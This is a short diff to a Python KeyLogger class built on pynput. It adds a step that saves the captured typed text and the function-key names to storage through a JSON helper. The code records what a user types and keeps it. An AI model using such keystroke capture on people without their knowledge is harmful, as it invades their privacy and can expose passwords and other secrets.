@@ -7,8 +7,10 @@ from pynput.keyboard import Listener
 # from pynput.keyboard._win32 import KeyCode
 from pynput import keyboard
 from Loggers.Logger import Logger
+from Functions.JSONLib import JSONLib
 
 logger = Logger()
+JSON = JSONLib()
 
 class KeyLogger(Logger):
 
@@ -52,6 +54,9 @@ class KeyLogger(Logger):
         if str(key) in functions_keys:
             self.set_keys(self.get_text(), text=True)
             self.set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
+            from Loggers.app_logger import ROOT
+            
+            JSON.save_text_data(self.get_text(), str(key).replace("Key.", "").upper())
             self.text = "" 
         if str(key) == "Key.cmd":
             self.set_keys("SUPER", key_press=key, text=False)
